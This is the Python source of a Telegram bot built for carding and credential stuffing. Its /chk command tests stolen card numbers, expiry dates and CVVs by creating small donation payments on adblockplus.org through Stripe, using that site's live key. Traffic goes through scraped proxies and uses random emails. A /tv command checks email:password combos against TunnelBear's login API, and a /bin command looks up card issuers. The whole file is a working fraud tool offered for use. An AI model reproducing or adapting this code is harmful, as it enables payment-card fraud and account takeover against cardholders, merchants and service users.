import logging
import os
import requests
import time
import string
import random

from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup

ENV = bool(os.environ.get('ENV', True))
TOKEN = os.environ.get("TOKEN", None)
BLACKLISTED = os.environ.get("BLACKLISTED", None) 
PREFIX = "!/"

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot)

###USE YOUR ROTATING PROXY### NEED HQ PROXIES ELSE WONT WORK UPDATE THIS FILED
r = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=20&country=all&ssl=all&anonymity=all&simplified=true').text
res = r.partition('\n')[0]
proxy = {"http": f"http://{res}"}
session = requests.session()

session.proxies = proxy #UNCOMMENT IT AFTER PROXIES

#random str GEN FOR EMAIL
N = 10
rnd = ''.join(random.choices(string.ascii_lowercase +
                                string.digits, k = N))


@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    await message.reply(
        "Hello how to use <code>/chk cc/mm/yy/cvv</code>\nREPO <a href='https://github.com/xbinner18/Mrbannker'>Here</a>"
    )
    

@dp.message_handler(commands=['tv'], commands_prefix=PREFIX)
async def tv(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    ac = message.text[len('/tv '):]
    splitter = ac.split(':')
    email = splitter[0]
    password = splitter[1]
    if not ac:
        return await message.reply(
            "<code>Send ac /tv email:pass.</code>"
        )
    payload = {
        "username": email,
        "password": password,
        "withUserDetails": "true",
        "v": "web-1.0"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    r = session.post("https://prod-api-core.tunnelbear.com/core/web/api/login",
                     data=payload, headers=headers)
    toc = time.perf_counter()
    
    # capture ac details
    if "Access denied" in r.text:
        await message.reply(f"""
<b>COMBO</b>➟ <code>{ac}</code>
<b>STATUS</b>➟ ❌WRONG DETAILS
TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    elif "PASS" in r.text:
        res = r.json()
        await message.reply(f"""
<b>COMBO</b>➟ <code>{ac}</code>
<b>STATUS</b>➟ ✅VALID
<b>LEVEL</b>➟ {res['details']['bearType']}
<b>VALIDTILL</b>➟ {res['details']['fullVersionUntil']}
TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    else:
        await message.reply("Error❌: REQ failed")
        
        
@dp.message_handler(commands=["bin"], commands_prefix=PREFIX)
async def binio(message: types.Message):
    await message.answer_chat_action("typing")
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("Send bin not ass")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    r = requests.get(f"https://bins.ws/search?bins={BIN}&bank=&country=").text
    soup = BeautifulSoup(r, features="html.parser")
    k = soup.find("div", {"class": "page"})
    INFO = f"""
═════════╕
<b>BIN INFO</b>
<code>{k.get_text()[62:]}</code>
CheckedBy: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
<b>Bot:</b> @BinnerRoBoT
╘═════════
"""
    await message.reply(INFO)
        
    
@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    cc = message.text[len('/chk '):]
    splitter = cc.split('|')
    ccn = splitter[0]
    mm = splitter[1]
    yy = splitter[2]
    cvv = splitter[3]
    email = f"{str(rnd)}@gmail.com"
    if not cc:
        return await message.reply(
            "<code>Send Card /chk cc|mm|yy|cvv.</code>"
        )   
    BIN = cc[:6]
    if BIN in BLACKLISTED:
        return await message.reply(
            "<b>BLACKLISTED BIN</b>"
            )
    # get guid muid sid
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    s = session.post("https://m.stripe.com/6",
                     headers=headers)
    r = s.json()
    Guid = r["guid"]
    Muid = r["muid"]
    Sid = r["sid"]
    
    # now 1 req
    payload = {
      "lang": "en",
      "type": "donation",
      "currency": "USD",
      "amount": "5",
      "custom": "x-0-b43513cf-721e-4263-8d1d-527eb414ea29",
      "currencySign": "$"
    }
    
    head = {
      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      "Accept": "*/*",
      "Origin": "https://adblockplus.org",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://adblockplus.org/",
      "Accept-Language": "en-US,en;q=0.9"
    }
    
    re = session.post("https://new-integration.adblockplus.org/",
                     data=payload, headers=head)
    client = re.text
    pi = client[0:27]
    
    #hmm
    load = {
      "receipt_email": email,
      "payment_method_data[type]": "card",
      "payment_method_data[billing_details][email]": email,
      "payment_method_data[card][number]": ccn,
      "payment_method_data[card][cvc]": cvv,
      "payment_method_data[card][exp_month]": mm,
      "payment_method_data[card][exp_year]": yy,
      "payment_method_data[guid]": Guid,
      "payment_method_data[muid]": Muid,
      "payment_method_data[sid]": Sid,
      "payment_method_data[payment_user_agent]": "stripe.js/af38c6da9;+stripe-js-v3/af38c6da9",
      "payment_method_data[referrer]": "https://adblockplus.org/",
      "expected_payment_method_type": "card",
      "use_stripe_sdk": "true",
      "webauthn_uvpa_available": "true",
      "spc_eligible": "false",
      "key": "pk_live_Nlfxy49RuJeHqF1XOAtUPUXg00fH7wpfXs",
      "client_secret": client
    }
    
    header = {
      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      "Accept": "application/json",
      "Origin": "https://js.stripe.com",
      "Referer": "https://js.stripe.com/",
      "Accept-Language": "en-US,en;q=0.9"
    }
    
    rx = session.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
                     data=load, headers=header)
    res = rx.json()
    msg = res["error"]["message"]
    toc = time.perf_counter()
    if "incorrect_cvc" in rx.text:
        await message.reply(f"""
✅<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    elif "Unrecognized request URL" in rx.text:
        await message.reply("[UPDATE] PROXIES ERROR")
    elif rx.status_code == 200:
        await message.reply(f"""
✔️<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    else:
        await message.reply(f"""
❌<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")  
    
    
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
